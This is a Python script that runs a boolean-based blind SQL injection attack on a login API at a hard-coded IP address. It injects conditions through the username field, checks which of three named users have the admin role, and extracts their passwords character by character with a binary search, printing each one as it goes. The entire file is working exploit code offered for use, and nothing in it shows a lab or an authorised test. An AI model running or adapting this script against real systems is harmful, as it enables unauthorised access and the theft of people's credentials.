#!/usr/bin/env python3
import json
import subprocess
import time

TARGET = "http://45.79.200.170:3000/api/login"
USERS = ["devon.pearce", "grant.whitfield", "maria.holloway"]
MAX_PASSWORD_LENGTH = 32
DELAY_SECONDS = 0.15


def oracle(condition: str) -> bool:
    payload = json.dumps({
        "username": f"' OR EXISTS(SELECT 1 FROM users WHERE {condition}) -- ",
        "password": "x",
    })
    result = subprocess.run(
        [
            "curl.exe", "-sS", "-o", "NUL", "-w", "%{http_code}",
            "-X", "POST", TARGET,
            "-H", "Content-Type: application/json",
            "--data-raw", payload,
        ],
        capture_output=True,
        text=True,
        check=False,
    )
    time.sleep(DELAY_SECONDS)
    return result.stdout.strip() == "200"


def extract_password(username: str) -> str | None:
    length = next(
        (n for n in range(1, MAX_PASSWORD_LENGTH + 1)
         if oracle(f"username='{username}' AND length(password)={n}")),
        None,
    )
    if length is None:
        return None

    password = []
    for pos in range(1, length + 1):
        lo, hi = 32, 126
        while lo < hi:
            mid = (lo + hi + 1) // 2
            condition = (
                f"username='{username}' AND "
                f"unicode(substr(password,{pos},1)) >= {mid}"
            )
            if oracle(condition):
                lo = mid
            else:
                hi = mid - 1
        password.append(chr(lo))
        print(f"    {pos}/{length}: {''.join(password)}", flush=True)
    return "".join(password)


for username in USERS:
    print(f"[*] Checking role: {username}")
    if oracle(f"username='{username}' AND role='admin'"):
        print(f"[!] ADMIN FOUND: {username}; stopping.")
        break

    password = extract_password(username)
    if password is None:
        print(f"[-] Password length not found for {username}")
    else:
        print(f"[+] {username}: {password}")
